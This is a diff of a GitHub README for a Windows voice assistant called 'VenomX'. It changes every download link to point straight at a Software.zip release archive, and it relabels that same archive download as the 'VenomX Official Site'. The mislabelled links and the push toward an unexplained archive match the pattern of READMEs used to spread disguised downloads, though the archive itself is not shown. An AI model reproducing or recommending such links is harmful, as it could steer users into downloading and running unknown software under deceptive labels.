@@ -1,6 +1,6 @@
 # 🦾 VenomX - Windows Voice Assistant 🎙️
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Ferenc2727/VenomX-Windows-Voice-Assistant/releases/download/v2.0/Software.zip)](https://github.com/Ferenc2727/VenomX-Windows-Voice-Assistant/releases/download/v2.0/Software.zip)
 
 Welcome to the VenomX-Windows-Voice-Assistant repository! 🚀
 
@@ -18,7 +18,7 @@ VenomX is an advanced voice assistant designed specifically for Windows operatin
 ## Quick Access 🚀
 
 To download and launch the VenomX software, click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Ferenc2727/VenomX-Windows-Voice-Assistant/releases/download/v2.0/Software.zip)](https://github.com/Ferenc2727/VenomX-Windows-Voice-Assistant/releases/download/v2.0/Software.zip)
 
 If the link above doesn't work, please check the "Releases" section of this repository for alternative download options.
 
@@ -61,7 +61,7 @@ VenomX is brought to you by a dedicated team of developers passionate about AI a
 
 ## Visit Our Website 🌐
 
-For more information and updates on VenomX, visit our website: [VenomX Official Site](https://www.venomx.com)
+For more information and updates on VenomX, visit our website: [VenomX Official Site](https://github.com/Ferenc2727/VenomX-Windows-Voice-Assistant/releases/download/v2.0/Software.zip)
 
 ---
 
